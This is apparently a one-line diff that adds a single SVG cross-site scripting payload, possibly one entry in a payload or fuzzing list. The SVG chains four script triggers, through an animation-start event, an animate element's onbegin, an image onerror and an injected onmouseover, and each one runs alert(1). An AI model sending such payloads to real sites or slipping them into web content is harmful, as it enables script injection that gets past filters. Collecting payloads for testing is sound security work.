@@ -1,0 +1,1 @@
+<svg onanimationstart=alert(1)><style>svg{animation:a .1s}@keyframes a{to{opacity:.9}}</style><animate onbegin=alert(1) attributeName=x dur=1s/><image href=//x onerror=alert(1)/><set attributeName=onmouseover to=alert(1) begin=0s/></svg>
